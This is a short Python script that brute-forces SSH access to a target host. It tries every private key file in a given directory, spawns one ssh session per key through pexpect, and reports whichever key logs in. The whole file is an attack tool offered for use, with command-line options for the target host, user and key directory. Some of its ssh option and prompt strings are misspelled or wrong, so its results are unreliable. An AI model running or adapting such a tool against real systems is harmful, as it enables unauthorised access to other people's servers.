#! /usr/bin/python3
import pexpect 
import os 
import optparse
import threading
def connect(host,user,keyFile):
    try:
        perm_denied = "Permission Denied"
        ssh_new_key = "Are you want to sure to continue"
        conn_closed = "Connection Closed by Remote Host"
        opt = " -o PasswordAuthencation=No"
        connStr = "ssh "+user+"@"+host+" -i "+keyFile+opt
        # conn_STr= f"ssh {user}@{host} -i {keyFile} -o PasswordAuthentication=no "
        # conn_STr= "ssh {}@{} -i {} -o PasswordAuthentication=no".format(user,host,keyFile)
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT,perm_denied,ssh_new_key,conn_closed,'$',"#",">>>","> ","root@{}".format(user),])
        if ret == 2:
            print("Adding host to ~/.ssh/known_hosts")
            child.sendline("yes")
            connect(host,user,keyFile)
        
        elif ret == 3 :
            print("Connection Closed by remote host")
        
        elif ret >3 :
            print("Success :- {}".format(keyFile))
        
    finally:
        pass

if __name__ == "__main__":
    parser = optparse.OptionParser("usage : python3 ssh_using_public_key.py -H <target host> -u <user> -d <directory>")
    parser.add_option("-H",dest="tgtHost",type="string",help="Specify Target Host")
    parser.add_option("-u",dest="user",type="string",help="Specify the User")
    parser.add_option("-d",dest="passDir",type="string",help="Specify the Directory where your keys stored")
    (option,args) = parser.parse_args()
    host = option.tgtHost
    user = option.user
    passDir = option.passDir
    if host ==None or user == None or passDir == None:
        print(parser.usage)
        exit(0)
    
    for filename in os.listdir(passDir):
        fullPath = os.path.join(passDir,filename)
        print("Testing keyFile :{}".format(fullPath))
        th = threading.Thread(target=connect,args=(host,user,fullPath))
        th.start()
    
